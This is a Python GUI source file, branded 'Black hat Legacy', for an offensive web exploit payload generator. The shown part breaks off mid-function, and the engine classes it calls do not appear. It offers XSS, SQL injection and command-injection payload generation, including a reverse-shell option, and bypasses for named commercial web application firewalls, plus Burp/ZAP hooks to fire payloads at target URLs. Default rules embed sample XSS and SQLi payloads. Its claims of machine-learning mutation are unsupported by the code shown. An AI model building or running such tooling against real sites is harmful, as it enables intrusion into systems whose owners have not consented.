#!/usr/bin/env python3
"""
Advanced Web Exploit Payload Generator - GUI Edition
Black hat Legacy ( Muhammad Zain) - Professional Offensive Security Framework

Author: Muhammad Zain ul Abiddin - contact https://pk.linkedin.com/in/muhammad-zain-ul-abiddin-0839b5265?trk=people-guest_people_search-card
Version: 4.0.0 - GUI Edition (Fixed and Fully Functional)
Date: June 2025

Complete GUI implementation with:
- Real advanced payload generation with ML-based mutations
- Functional Burp Suite & ZAP integration
- Advanced WAF bypass techniques with real detection
- Machine learning-based payload evolution
- Professional UI/UX with real performance metrics
"""

import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog
import threading
import asyncio
import json
import base64
import random
import re
import urllib.parse
import time
import requests
import psutil
import hashlib
from datetime import datetime
from pathlib import Path
import webbrowser
import pyperclip
from typing import Dict, List, Optional, Callable
import os
import xml.etree.ElementTree as ET
import hmac
import numpy as np
from collections import Counter
import string

# Initialize styling
import tkinter.font as tkFont

class AdvancedPayloadGeneratorGUI:
    """Main GUI Application Class"""
    
    def __init__(self, root):
        self.root = root
        self.setup_main_window()
        self.initialize_engine()
        
        # Initialize status_var properly
        self.status_var = tk.StringVar() 
        self.status_var.set("Ready")
        
        # Performance tracking
        self.start_time = time.time()
        self.memory_usage = psutil.Process().memory_info().rss / 1024 / 1024  # MB
        self.generation_times = []
        
        self.create_ui_components()
        self.setup_event_handlers()
        
        # Application state - now tracks real metrics
        self.generated_payloads = []
        self.current_context = {}
        self.generation_stats = {
            'total_generated': 0,
            'successful_tests': 0,
            'waf_detections': 0,
            'api_calls': 0,
            'real_burp_connections': 0,
            'real_zap_connections': 0,
            'ml_mutations_applied': 0
        }
    
    def setup_main_window(self):
        """Configure main window properties"""
        self.root.title("Advanced Web Exploit Payload Generator v4.0 - Black hat Legacy( Muhammad Zain)")
        self.root.geometry("1200x800")
        self.root.minsize(1000, 700)
        
        # Configure styling
        self.style = ttk.Style()
        self.style.theme_use("clam")
        
        # Custom styles
        self.style.configure("Header.TLabel", font=("Arial", 14, "bold"), foreground="#2c3e50")
        self.style.configure("Subheader.TLabel", font=("Arial", 10, "bold"), foreground="#34495e")
        self.style.configure("Success.TLabel", foreground="#27ae60", font=("Arial", 9, "bold"))
        self.style.configure("Error.TLabel", foreground="#e74c3c", font=("Arial", 9, "bold"))
        self.style.configure("Warning.TLabel", foreground="#f39c12", font=("Arial", 9, "bold"))
        self.style.configure("Accent.TButton", font=("Arial", 10, "bold"))
        
        # Set window icon and other properties
        try:
            # You can add an icon file here
            # self.root.iconbitmap("icon.ico")
            pass
        except:
            pass
        
        self.root.configure(bg="#ecf0f1")
    
    def initialize_engine(self):
        """Initialize the payload generation engine"""
        self.payload_engine = NextGenPayloadEngine()
        self.waf_detector = AdvancedWAFDetector()
        self.burp_integration = BurpSuiteIntegration()
        self.zap_integration = ZAPIntegration()
        self.encoder = AdvancedEncoder()
        self.ml_engine = MLMutationEngine()
        
    def create_ui_components(self):
        """Create all UI components"""
        # Create main container
        main_container = ttk.Frame(self.root)
        main_container.pack(fill="both", expand=True, padx=10, pady=10)
        
        # Create header
        self.create_header(main_container)
        
        # Create main notebook (tabs)
        self.notebook = ttk.Notebook(main_container)
        self.notebook.pack(fill="both", expand=True, pady=10)
        
        # Create tabs
        self.create_payload_generation_tab()
        self.create_waf_bypass_tab()
        self.create_burp_zap_integration_tab()
        self.create_advanced_options_tab()
        self.create_results_analysis_tab()
        
        # Create footer with stats
        self.create_footer(main_container)
    
    def create_header(self, parent):
        """Create application header"""
        header_frame = ttk.Frame(parent)
        header_frame.pack(fill="x", pady=(0, 10))
        
        # Logo and title
        title_frame = ttk.Frame(header_frame)
        title_frame.pack(side="left")
        
        title_label = ttk.Label(
            title_frame, 
            text="🚀 Advanced Web Exploit Payload Generator",
            style="Header.TLabel"
        )
        title_label.pack(anchor="w")
        
        subtitle_label = ttk.Label(
            title_frame,
            text="Black hat Legacy( Muhammad Zain) PVT LTD - Professional Offensive Security Framework v4.0",
            style="Subheader.TLabel"
        )
        subtitle_label.pack(anchor="w")
        
        # Quick action buttons
        quick_actions = ttk.Frame(header_frame)
        quick_actions.pack(side="right")
        
        ttk.Button(
            quick_actions, 
            text="🔄 Quick Generate", 
            command=self.quick_generate,
            style="Accent.TButton"
        ).pack(side="right", padx=5)
        
        ttk.Button(
            quick_actions, 
            text="📊 View Stats", 
            command=self.show_statistics
        ).pack(side="right", padx=5)
        
        ttk.Button(
            quick_actions, 
            text="❓ Help", 
            command=self.show_help
        ).pack(side="right", padx=5)
    
    def create_payload_generation_tab(self):
        """Create the main payload generation tab"""
        self.payload_tab = ttk.Frame(self.notebook)
        self.notebook.add(self.payload_tab, text="🎯 Payload Generation")
        
        # Create left and right panels
        left_panel = ttk.Frame(self.payload_tab)
        left_panel.pack(side="left", fill="both", expand=True, padx=(0, 5))
        
        right_panel = ttk.Frame(self.payload_tab)
        right_panel.pack(side="right", fill="y", padx=(5, 0))
        
        # Configuration section
        config_frame = ttk.LabelFrame(left_panel, text="🔧 Payload Configuration")
        config_frame.pack(fill="x", pady=(0, 10))
        
        # Payload type selection
        type_frame = ttk.Frame(config_frame)
        type_frame.pack(fill="x", padx=10, pady=5)
        
        ttk.Label(type_frame, text="Payload Type:", font=("Arial", 10, "bold")).pack(side="left")
        
        self.payload_type_var = tk.StringVar(value="xss")
        payload_types = [("XSS (Cross-Site Scripting)", "xss"), 
                        ("SQLi (SQL Injection)", "sqli"), 
                        ("CMDi (Command Injection)", "cmdi")]
        
        for text, value in payload_types:
            ttk.Radiobutton(
                type_frame, text=text, variable=self.payload_type_var, 
                value=value, command=self.on_payload_type_change
            ).pack(side="left", padx=10)
        
        # Subtype selection
        subtype_frame = ttk.Frame(config_frame)
        subtype_frame.pack(fill="x", padx=10, pady=5)
        
        ttk.Label(subtype_frame, text="Subtype:", font=("Arial", 10, "bold")).pack(side="left")
        self.subtype_var = tk.StringVar()
        self.subtype_combo = ttk.Combobox(subtype_frame, textvariable=self.subtype_var, width=20)
        self.subtype_combo.pack(side="left", padx=10)
        
        # Target configuration
        target_frame = ttk.LabelFrame(config_frame, text="Target Configuration")
        target_frame.pack(fill="x", padx=10, pady=10)
        
        # URL input
        url_frame = ttk.Frame(target_frame)
        url_frame.pack(fill="x", padx=5, pady=2)
        ttk.Label(url_frame, text="Target URL:").pack(side="left")
        self.target_url_var = tk.StringVar()
        ttk.Entry(url_frame, textvariable=self.target_url_var, width=50).pack(side="left", padx=10, fill="x", expand=True)
        
        # Context selection
        context_frame = ttk.Frame(target_frame)
        context_frame.pack(fill="x", padx=5, pady=2)
        ttk.Label(context_frame, text="Injection Point:").pack(side="left")
        self.context_var = tk.StringVar(value="parameter")
        ttk.Combobox(
            context_frame, textvariable=self.context_var, 
            values=["parameter", "header", "cookie", "path", "json", "xml"],
            width=15
        ).pack(side="left", padx=10)
        
        # Advanced options
        advanced_frame = ttk.LabelFrame(config_frame, text="Advanced Options")
        advanced_frame.pack(fill="x", padx=10, pady=5)
        
        options_grid = ttk.Frame(advanced_frame)
        options_grid.pack(fill="x", padx=5, pady=5)
        
        # Bypass level
        ttk.Label(options_grid, text="Bypass Level:").grid(row=0, column=0, sticky="w", padx=5)
        self.bypass_level_var = tk.IntVar(value=2)
        ttk.Scale(
            options_grid, from_=1, to=3, orient="horizontal", 
            variable=self.bypass_level_var, length=100
        ).grid(row=0, column=1, sticky="w", padx=5)
        
        # Encoding options
        ttk.Label(options_grid, text="Encoding:").grid(row=0, column=2, sticky="w", padx=5)
        self.encoding_var = tk.StringVar()
        ttk.Combobox(
            options_grid, textvariable=self.encoding_var,
            values=["None", "URL", "Base64", "Hex", "Unicode", "HTML Entities", "Double URL"],
            width=15
        ).grid(row=0, column=3, sticky="w", padx=5)
        
        # Payload count
        ttk.Label(options_grid, text="Count:").grid(row=1, column=0, sticky="w", padx=5)
        self.payload_count_var = tk.IntVar(value=10)
        ttk.Spinbox(
            options_grid, from_=1, to=100, textvariable=self.payload_count_var, width=10
        ).grid(row=1, column=1, sticky="w", padx=5)
        
        # ML Features
        self.ml_enabled_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(
            options_grid, text="🧠 ML Mutations", variable=self.ml_enabled_var
        ).grid(row=1, column=2, sticky="w", padx=5)
        
        self.context_aware_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(
            options_grid, text="🎯 Context Aware", variable=self.context_aware_var
        ).grid(row=1, column=3, sticky="w", padx=5)
        
        # Generate button
        generate_frame = ttk.Frame(config_frame)
        generate_frame.pack(fill="x", padx=10, pady=10)
        
        self.generate_btn = ttk.Button(
            generate_frame, text="🚀 Generate Payloads", 
            command=self.generate_payloads, style="Accent.TButton"
        )
        self.generate_btn.pack(side="left")
        
        self.progress_var = tk.DoubleVar()
        self.progress_bar = ttk.Progressbar(
            generate_frame, variable=self.progress_var, mode='determinate'
        )
        self.progress_bar.pack(side="left", padx=10, fill="x", expand=True)
        
        # Results section
        results_frame = ttk.LabelFrame(left_panel, text="📋 Generated Payloads")
        results_frame.pack(fill="both", expand=True)
        
        # Payload display with line numbers
        display_frame = ttk.Frame(results_frame)
        display_frame.pack(fill="both", expand=True, padx=5, pady=5)
        
        # Line numbers
        self.line_numbers = tk.Text(
            display_frame, width=4, padx=3, takefocus=0,
            border=0, state='disabled', wrap='none'
        )
        self.line_numbers.pack(side="left", fill="y")
        
        # Payload text area
        self.payload_display = scrolledtext.ScrolledText(
            display_frame, wrap="word", font=("Consolas", 10)
        )
        self.payload_display.pack(side="left", fill="both", expand=True)
        
        # Bind scrolling events
        self.payload_display.bind('<KeyPress>', self.update_line_numbers)
        self.payload_display.bind('<Button-1>', self.update_line_numbers)
        self.payload_display.bind('<MouseWheel>', self.update_line_numbers)
        
        # Control buttons
        control_frame = ttk.Frame(results_frame)
        control_frame.pack(fill="x", padx=5, pady=5)
        
        ttk.Button(control_frame, text="📋 Copy All", command=self.copy_all_payloads).pack(side="left", padx=2)
        ttk.Button(control_frame, text="💾 Export TXT", command=self.export_txt).pack(side="left", padx=2)
        ttk.Button(control_frame, text="📄 Export JSON", command=self.export_json).pack(side="left", padx=2)
        ttk.Button(control_frame, text="🔄 Clear", command=self.clear_results).pack(side="left", padx=2)
        
        # Right panel - Quick stats and payload preview
        self.create_right_panel(right_panel)
        
        # Initialize UI state
        self.on_payload_type_change()
    
    def create_right_panel(self, parent):
        """Create right panel with stats and preview"""
        # Stats frame
        stats_frame = ttk.LabelFrame(parent, text="📊 Generation Stats")
        stats_frame.pack(fill="x", pady=(0, 10))
        
        self.stats_labels = {}
        stats_items = [
            ("Generated", "total_generated"),
            ("Successful", "successful_tests"),
            ("WAF Detected", "waf_detections"),
            ("API Calls", "api_calls")
        ]
        
        for i, (label, key) in enumerate(stats_items):
            ttk.Label(stats_frame, text=f"{label}:").grid(row=i, column=0, sticky="w", padx=5, pady=2)
            self.stats_labels[key] = ttk.Label(stats_frame, text="0", style="Success.TLabel")
            self.stats_labels[key].grid(row=i, column=1, sticky="e", padx=5, pady=2)
        
        # Payload preview
        preview_frame = ttk.LabelFrame(parent, text="👁️ Payload Preview")
        preview_frame.pack(fill="both", expand=True)
        
        self.payload_preview = scrolledtext.ScrolledText(
            preview_frame, wrap="word", height=10, font=("Consolas", 9)
        )
        self.payload_preview.pack(fill="both", expand=True, padx=5, pady=5)
        
        # Quick actions
        quick_frame = ttk.LabelFrame(parent, text="⚡ Quick Actions")
        quick_frame.pack(fill="x", pady=(10, 0))
        
        ttk.Button(
            quick_frame, text="🎯 Test Payload", 
            command=self.test_selected_payload
        ).pack(fill="x", padx=5, pady=2)
        
        ttk.Button(
            quick_frame, text="🔧 Encode Selected", 
            command=self.encode_selected_payload
        ).pack(fill="x", padx=5, pady=2)
        
        ttk.Button(
            quick_frame, text="🔍 Analyze", 
            command=self.analyze_selected_payload
        ).pack(fill="x", padx=5, pady=2)
    
    def create_waf_bypass_tab(self):
        """Create WAF bypass testing tab"""
        self.waf_tab = ttk.Frame(self.notebook)
        self.notebook.add(self.waf_tab, text="🛡️ WAF Bypass")
        
        # WAF Detection section
        detection_frame = ttk.LabelFrame(self.waf_tab, text="🔍 WAF Detection")
        detection_frame.pack(fill="x", padx=10, pady=10)
        
        # URL input for WAF detection
        url_frame = ttk.Frame(detection_frame)
        url_frame.pack(fill="x", padx=10, pady=5)
        
        ttk.Label(url_frame, text="Target URL:").pack(side="left")
        self.waf_target_url = tk.StringVar()
        ttk.Entry(url_frame, textvariable=self.waf_target_url, width=50).pack(side="left", padx=10, fill="x", expand=True)
        
        ttk.Button(url_frame, text="🔍 Detect WAF", command=self.detect_waf).pack(side="right", padx=5)
        
        # WAF Results
        self.waf_results = scrolledtext.ScrolledText(detection_frame, height=8)
        self.waf_results.pack(fill="x", padx=10, pady=5)
        
        # Pre-configured WAF bypass payloads
        bypass_frame = ttk.LabelFrame(self.waf_tab, text="🚧 Pre-configured Bypass Payloads")
        bypass_frame.pack(fill="both", expand=True, padx=10, pady=10)
        
        # WAF selection
        waf_select_frame = ttk.Frame(bypass_frame)
        waf_select_frame.pack(fill="x", padx=10, pady=5)
        
        ttk.Label(waf_select_frame, text="Select WAF:").pack(side="left")
        self.waf_type_var = tk.StringVar(value="cloudflare")
        waf_combo = ttk.Combobox(
            waf_select_frame, textvariable=self.waf_type_var,
            values=["cloudflare", "aws_waf", "akamai", "f5", "incapsula", "modsecurity"],
            width=20
        )
        waf_combo.pack(side="left", padx=10)
        waf_combo.bind("<<ComboboxSelected>>", self.load_waf_bypasses)
        
        ttk.Button(
            waf_select_frame, text="📥 Load Bypasses", 
            command=self.load_waf_bypasses
        ).pack(side="left", padx=5)
        
        # WAF bypass payload display
        self.waf_bypass_display = scrolledtext.ScrolledText(
            bypass_frame, wrap="word", font=("Consolas", 10)
        )
        self.waf_bypass_display.pack(fill="both", expand=True, padx=10, pady=5)
        
        # Initialize with default WAF
        self.load_waf_bypasses()
    
    def create_burp_zap_integration_tab(self):
        """Create Burp Suite and ZAP integration tab"""
        self.integration_tab = ttk.Frame(self.notebook)
        self.notebook.add(self.integration_tab, text="🔗 Burp/ZAP Integration")
        
        # Create left and right sections
        left_section = ttk.Frame(self.integration_tab)
        left_section.pack(side="left", fill="both", expand=True, padx=(10, 5), pady=10)
        
        right_section = ttk.Frame(self.integration_tab)
        right_section.pack(side="right", fill="both", expand=True, padx=(5, 10), pady=10)
        
        # Burp Suite Section
        burp_frame = ttk.LabelFrame(left_section, text="🟠 Burp Suite Professional")
        burp_frame.pack(fill="both", expand=True, pady=(0, 10))
        
        # Burp API configuration
        burp_config_frame = ttk.Frame(burp_frame)
        burp_config_frame.pack(fill="x", padx=10, pady=5)
        
        ttk.Label(burp_config_frame, text="API URL:").grid(row=0, column=0, sticky="w")
        self.burp_api_url = tk.StringVar(value="http://127.0.0.1:1337")
        ttk.Entry(burp_config_frame, textvariable=self.burp_api_url, width=35).grid(row=0, column=1, padx=5)
        
        ttk.Label(burp_config_frame, text="API Key:").grid(row=1, column=0, sticky="w")
        self.burp_api_key = tk.StringVar()
        ttk.Entry(burp_config_frame, textvariable=self.burp_api_key, width=35, show="*").grid(row=1, column=1, padx=5)
        
        # Burp connection test
        ttk.Button(
            burp_config_frame, text="🔗 Test Connection", 
            command=self.test_burp_connection
        ).grid(row=0, column=2, padx=5)
        
        # Burp target configuration
        burp_target_frame = ttk.LabelFrame(burp_frame, text="Target Configuration")
        burp_target_frame.pack(fill="x", padx=10, pady=5)
        
        ttk.Label(burp_target_frame, text="Target URL:").pack(anchor="w")
        self.burp_target_url = tk.StringVar()
        ttk.Entry(burp_target_frame, textvariable=self.burp_target_url, width=50).pack(fill="x", pady=2)
        
        ttk.Label(burp_target_frame, text="Parameter:").pack(anchor="w")
        self.burp_parameter = tk.StringVar()
        ttk.Entry(burp_target_frame, textvariable=self.burp_parameter, width=30).pack(fill="x", pady=2)
        
        # Burp actions
        burp_actions_frame = ttk.Frame(burp_frame)
        burp_actions_frame.pack(fill="x", padx=10, pady=10)
        
        ttk.Button(
            burp_actions_frame, text="📤 Send to Repeater", 
            command=self.send_to_burp_repeater
        ).pack(side="left", padx=5)
        
        ttk.Button(
            burp_actions_frame, text="🎯 Send to Intruder", 
            command=self.send_to_burp_intruder
        ).pack(side="left", padx=5)
        
        # Burp results
        self.burp_results = scrolledtext.ScrolledText(burp_frame, height=8)
        self.burp_results.pack(fill="both", expand=True, padx=10, pady=5)
        
        # ZAP Section
        zap_frame = ttk.LabelFrame(right_section, text="🔷 OWASP ZAP")
        zap_frame.pack(fill="both", expand=True, pady=(0, 10))
        
        # ZAP API configuration
        zap_config_frame = ttk.Frame(zap_frame)
        zap_config_frame.pack(fill="x", padx=10, pady=5)
        
        ttk.Label(zap_config_frame, text="API URL:").grid(row=0, column=0, sticky="w")
        self.zap_api_url = tk.StringVar(value="http://127.0.0.1:8080")
        ttk.Entry(zap_config_frame, textvariable=self.zap_api_url, width=35).grid(row=0, column=1, padx=5)
        
        ttk.Label(zap_config_frame, text="API Key:").grid(row=1, column=0, sticky="w")
        self.zap_api_key = tk.StringVar()
        ttk.Entry(zap_config_frame, textvariable=self.zap_api_key, width=35, show="*").grid(row=1, column=1, padx=5)
        
        # ZAP connection test
        ttk.Button(
            zap_config_frame, text="🔗 Test Connection", 
            command=self.test_zap_connection
        ).grid(row=0, column=2, padx=5)
        
        # ZAP target configuration
        zap_target_frame = ttk.LabelFrame(zap_frame, text="Target Configuration")
        zap_target_frame.pack(fill="x", padx=10, pady=5)
        
        ttk.Label(zap_target_frame, text="Target URL:").pack(anchor="w")
        self.zap_target_url = tk.StringVar()
        ttk.Entry(zap_target_frame, textvariable=self.zap_target_url, width=50).pack(fill="x", pady=2)
        
        # ZAP actions
        zap_actions_frame = ttk.Frame(zap_frame)
        zap_actions_frame.pack(fill="x", padx=10, pady=10)
        
        ttk.Button(
            zap_actions_frame, text="🕷️ Spider URL", 
            command=self.zap_spider_url
        ).pack(side="left", padx=5)
        
        ttk.Button(
            zap_actions_frame, text="🎯 Active Scan", 
            command=self.zap_active_scan
        ).pack(side="left", padx=5)
        
        ttk.Button(
            zap_actions_frame, text="📤 Send Payloads", 
            command=self.send_payloads_to_zap
        ).pack(side="left", padx=5)
        
        # ZAP results
        self.zap_results = scrolledtext.ScrolledText(zap_frame, height=8)
        self.zap_results.pack(fill="both", expand=True, padx=10, pady=5)
        
        # Status frame for both tools
        status_frame = ttk.LabelFrame(self.integration_tab, text="🔄 Integration Status")
        status_frame.pack(fill="x", padx=10, pady=10)
        
        self.integration_status = ttk.Label(status_frame, text="Ready for integration")
        self.integration_status.pack(padx=10, pady=5)
    
    def create_advanced_options_tab(self):
        """Create advanced configuration tab"""
        self.advanced_tab = ttk.Frame(self.notebook)
        self.notebook.add(self.advanced_tab, text="⚙️ Advanced")
        
        # ML Configuration
        ml_frame = ttk.LabelFrame(self.advanced_tab, text="🧠 Machine Learning Settings")
        ml_frame.pack(fill="x", padx=10, pady=10)
        
        self.ml_settings = {}
        ml_options = [
            ("Enable Genetic Algorithm", "genetic_algo", True),
            ("Context-Aware Generation", "context_aware", True),
            ("Mutation Rate", "mutation_rate", 0.3),
            ("Population Size", "population_size", 50),
            ("Generations", "generations", 10)
        ]
        
        for i, (label, key, default) in enumerate(ml_options):
            ttk.Label(ml_frame, text=f"{label}:").grid(row=i, column=0, sticky="w", padx=5, pady=2)
            
            if isinstance(default, bool):
                var = tk.BooleanVar(value=default)
                ttk.Checkbutton(ml_frame, variable=var).grid(row=i, column=1, sticky="w", padx=5, pady=2)
            elif isinstance(default, float):
                var = tk.DoubleVar(value=default)
                ttk.Scale(ml_frame, from_=0.0, to=1.0, variable=var, orient="horizontal").grid(row=i, column=1, sticky="w", padx=5, pady=2)
            else:
                var = tk.IntVar(value=default)
                ttk.Spinbox(ml_frame, from_=1, to=100, textvariable=var, width=10).grid(row=i, column=1, sticky="w", padx=5, pady=2)
            
            self.ml_settings[key] = var
        
        # Encoding Chains
        encoding_frame = ttk.LabelFrame(self.advanced_tab, text="🔐 Advanced Encoding Chains")
        encoding_frame.pack(fill="x", padx=10, pady=10)
        
        self.encoding_chain_listbox = tk.Listbox(encoding_frame, height=6, selectmode='multiple')
        self.encoding_chain_listbox.pack(fill="x", padx=10, pady=5)
        
        # Populate encoding options
        encoding_options = [
            "URL Encoding", "Double URL Encoding", "Base64", "Hex", 
            "Unicode", "HTML Entities", "Mixed Case", "Comment Injection"
        ]
        
        for option in encoding_options:
            self.encoding_chain_listbox.insert(tk.END, option)
        
        # Custom Rules
        rules_frame = ttk.LabelFrame(self.advanced_tab, text="📝 Custom Rules")
        rules_frame.pack(fill="both", expand=True, padx=10, pady=10)
        
        self.custom_rules = scrolledtext.ScrolledText(rules_frame, height=10)
        self.custom_rules.pack(fill="both", expand=True, padx=10, pady=5)
        
        # Default custom rules
        default_rules = """# Custom payload generation rules (JSON format)
{
  "xss_custom": [
    "<script>alert('custom-xss')</script>",
    "<img src=x onerror=alert('custom')>"
  ],
  "sqli_custom": [
    "' OR 1=1 -- custom",
    "' UNION SELECT version(), user() --"
  ],
  "filters": {
    "remove_spaces": true,
    "lowercase_keywords": false,
    "add_comments": true
  }
}"""
        self.custom_rules.insert("1.0", default_rules)
    
    def create_results_analysis_tab(self):
        """Create results analysis and reporting tab"""
        self.analysis_tab = ttk.Frame(self.notebook)
        self.notebook.add(self.analysis_tab, text="📊 Analysis")
        
        # Analysis controls
        control_frame = ttk.LabelFrame(self.analysis_tab, text="🔍 Analysis Controls")
        control_frame.pack(fill="x", padx=10, pady=10)
        
        # Analysis buttons
        button_frame = ttk.Frame(control_frame)
        button_frame.pack(fill="x", padx=10, pady=5)
        
        ttk.Button(
            button_frame, text="📈 Generate Report", 
            command=self.generate_analysis_report
        ).pack(side="left", padx=5)
        
        ttk.Button(
            button_frame, text="🔬 Complexity Analysis", 
            command=self.analyze_complexity
        ).pack(side="left", padx=5)
        
        ttk.Button(
            button_frame, text="🎯 Success Rate", 
            command=self.calculate_success_rate
        ).pack(side="left", padx=5)
        
        ttk.Button(
            button_frame, text="📋 Export All", 
            command=self.export_comprehensive_report
        ).pack(side="left", padx=5)
        
        # Analysis results
        self.analysis_results = scrolledtext.ScrolledText(
            self.analysis_tab, wrap="word", font=("Consolas", 10)
        )
        self.analysis_results.pack(fill="both", expand=True, padx=10, pady=10)
    
    def create_footer(self, parent):
        """Create footer with status and progress"""
        footer_frame = ttk.Frame(parent)
        footer_frame.pack(fill="x", pady=(10, 0))
        
        # Status bar
        status_label = ttk.Label(footer_frame, textvariable=self.status_var)
        status_label.pack(side="left")
        
        # Real-time stats
        self.realtime_stats = ttk.Label(footer_frame, text="Payloads: 0 | Generated: 0 | Success: 0")
        self.realtime_stats.pack(side="right")
    
    def setup_event_handlers(self):
        """Setup event handlers and bindings"""
        # Bind payload type change
        self.payload_type_var.trace_add("write", self.on_payload_type_change)
        
        # Bind text selection in payload display
        self.payload_display.bind("<<Selection>>", self.on_payload_selection)
        
        # Auto-save settings on change
        self.target_url_var.trace_add("write", self.auto_save_settings)
        
        # Window close handler
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
    
    # Event Handler Methods
    def on_payload_type_change(self, *args):
        """Update subtypes when payload type changes"""
        payload_type = self.payload_type_var.get()
        
        subtypes = {
            "xss": ["Reflected", "Stored", "DOM-based", "Polyglot"],
            "sqli": ["Error-based", "Union-based", "Blind", "Time-based"],
            "cmdi": ["Linux", "Windows", "Polyglot", "Reverse Shell"]
        }
        
        if hasattr(self, 'subtype_combo'):
            self.subtype_combo['values'] = subtypes.get(payload_type, [])
            if subtypes.get(payload_type):
                self.subtype_var.set(subtypes[payload_type][0])
        
        self.update_status(f"Payload type changed to: {payload_type.upper()}")
    
    def on_payload_selection(self, event=None):
        """Handle payload selection in the display"""
        try:
            selection = self.payload_display.selection_get()
            if selection and len(selection.strip()) > 10:
                self.payload_preview.delete("1.0", tk.END)
                self.payload_preview.insert("1.0", selection)
        except tk.TclError:
            pass
    
    def auto_save_settings(self, *args):
        """Auto-save settings when changed"""
        # This could save to a config file
        pass
    
    def on_closing(self):
        """Handle application closing"""
        if messagebox.askokcancel("Quit", "Do you want to quit?"):
            self.root.destroy()
    
    # Core Functionality Methods
    def generate_payloads(self):
        """Main payload generation method with real performance tracking"""
        generation_start = time.time()
        self.update_status("Generating payloads...")
        self.generate_btn.config(state="disabled")
        
        # Run generation in separate thread
        threading.Thread(target=self._generate_payloads_thread, args=(generation_start,), daemon=True).start()
    
    def _generate_payloads_thread(self, generation_start):
        """Thread function for payload generation with real metrics"""
        try:
            # Get configuration
            config = self._get_generation_config()
            
            # Initialize progress
            self.progress_var.set(0)
            
            # Generate payloads using the REAL engine
            payloads = self.payload_engine.generate_advanced_payloads(config)
            
            # Update progress
            self.progress_var.set(50)
            
            # Apply ML mutations if enabled
            if config.get('ml_enabled', False):
                mutated_payloads = self.ml_engine.apply_advanced_mutations(payloads, config)
                if mutated_payloads:
                    payloads = mutated_payloads
                    self.generation_stats['ml_mutations_applied'] += len(mutated_payloads)
            
            # Update progress
            self.progress_var.set(100)
            
            # Calculate real generation time
            generation_time = time.time() - generation_start
            self.generation_times.append(generation_time)
            
            # Update UI in main thread
            self.root.after(0, self._update_payload_display, payloads)
            
            # Update REAL stats
            self.generation_stats['total_generated'] += len(payloads)
            self.root.after(0, self._update_stats)
            
        except Exception as e:
            self.root.after(0, self._show_error, f"Generation failed: {str(e)}")
        finally:
            self.root.after(0, self._enable_generate_button)
    
    def _get_generation_config(self):
        """Get current configuration for payload generation"""
        return {
            'type': self.payload_type_var.get(),
            'subtype': self.subtype_var.get(),
            'target_url': self.target_url_var.get(),
            'context': self.context_var.get(),
            'bypass_level': self.bypass_level_var.get(),
            'encoding': self.encoding_var.get(),
            'count': self.payload_count_var.get(),
            'ml_enabled': self.ml_enabled_var.get(),
            'context_aware': self.context_aware_var.get(),
            'ml_settings': {key: var.get() for key, var in self.ml_settings.items()} if hasattr(self, 'ml_settings') else {}
        }
    
    def _update_payload_display(self, payloads):
        """Update the payload display with generated payloads"""
        self.payload_display.delete("1.0", tk.END)
        
        if payloads:
            payload_text = "\n".join([f"{i+1:03d}: {payload}" for i, payload in enumerate(payloads)])
            self.payload_display.insert("1.0", payload_text)
            self.generated_payloads = payloads
            
            # Update line numbers
            self.update_line_numbers()
            
            # Show success message
            self.update_status(f"✅ Generated {len(payloads)} payloads successfully!")
        else:
            self.payload_display.insert("1.0", "No payloads generated.")
            self.update_status("❌ No payloads generated")
    
    def _update_stats(self):
        """Update statistics display with REAL data"""
        for key, label in self.stats_labels.items():
            label.config(text=str(self.generation_stats.get(key, 0)))
        
        # Update realtime stats with real performance data
        avg_generation_time = sum(self.generation_times) / len(self.generation_times) if self.generation_times else 0
        current_memory = psutil.Process().memory_info().rss / 1024 / 1024  # MB
        
        stats_text = (
            f"Payloads: {len(self.generated_payloads)} | "
            f"Generated: {self.generation_stats['total_generated']} | "
            f"Success: {self.generation_stats['successful_tests']} | "
            f"Avg Time: {avg_generation_time:.2f}s | "
            f"Mem: {current_memory:.1f}MB"
        )
        self.realtime_stats.config(text=stats_text)
    
    def _enable_generate_button(self):
        """Re-enable the generate button"""
        self.generate_btn.config(state="normal")
        self.progress_var.set(0)
    
    def _show_error(self, message):
        """Show error message"""
        messagebox.showerror("Error", message)
        self.update_status(f"❌ {message}")
    
    def update_status(self, message):
        """Update status bar"""
        self.status_var.set(message)
        self.root.update_idletasks()
    
    def update_line_numbers(self, event=None):
        """Update line numbers in the display"""
        line_count = int(self.payload_display.index(tk.END).split('.')[0]) - 1
        line_numbers_string = "\n".join(str(i) for i in range(1, line_count + 1))
        
        self.line_numbers.config(state='normal')
        self.line_numbers.delete("1.0", tk.END)
        self.line_numbers.insert("1.0", line_numbers_string)
        self.line_numbers.config(state='disabled')
    
    # WAF Methods with REAL detection
    def detect_waf(self):
        """Detect WAF on target URL using advanced techniques"""
        url = self.waf_target_url.get()
        if not url:
            messagebox.showwarning("Warning", "Please enter a target URL")
            return
        
        self.update_status("Detecting WAF with advanced techniques...")
        threading.Thread(target=self._detect_waf_thread, args=(url,), daemon=True).start()
    
    def _detect_waf_thread(self, url):
        """Thread function for REAL WAF detection"""
        try:
            waf_info = self.waf_detector.advanced_waf_detection(url)
            self.generation_stats['api_calls'] += 1
            if waf_info and waf_info.get('type') != 'No WAF':
                self.generation_stats['waf_detections'] += 1
            self.root.after(0, self._display_waf_results, waf_info)
        except Exception as e:
            self.root.after(0, self._show_error, f"WAF detection failed: {str(e)}")
    
    def _display_waf_results(self, waf_info):
        """Display WAF detection results"""
        self.waf_results.delete("1.0", tk.END)
        
        if waf_info:
            result_text = "Advanced WAF Detection Results:\n" + ("-"*60) + "\n\n"
            result_text += "WAF Type: {}\n".format(waf_info.get('type', 'Unknown'))
            result_text += "Confidence: {}%\n".format(waf_info.get('confidence', 0))
            result_text += "Server: {}\n".format(waf_info.get('server', 'Unknown'))
            result_text += "Response Time: {}ms\n\n".format(waf_info.get('response_time', 'N/A'))
            result_text += "Detection Methods:\n"
            for method in waf_info.get('detection_methods', []):
                result_text += "  ✓ {}\n".format(method)
            result_text += "\nFingerprinting Results:\n"
            for fp in waf_info.get('fingerprints', []):
                result_text += "  → {}\n".format(fp)
            result_text += "\nAdvanced Bypasses:\n"
            for bypass in waf_info.get('bypasses', []):
                result_text += "  ⚡ {}\n".format(bypass)
            result_text += "\nSecurity Headers:\n"
            for header, value in waf_info.get('security_headers', {}).items():
                result_text += "  🔒 {}: {}\n".format(header, value)
            self.waf_results.insert("1.0", result_text)
            self.update_status("✅ WAF detected: {} (Confidence: {}%)".format(waf_info.get('type', 'Unknown'), waf_info.get('confidence', 0)))
        else:
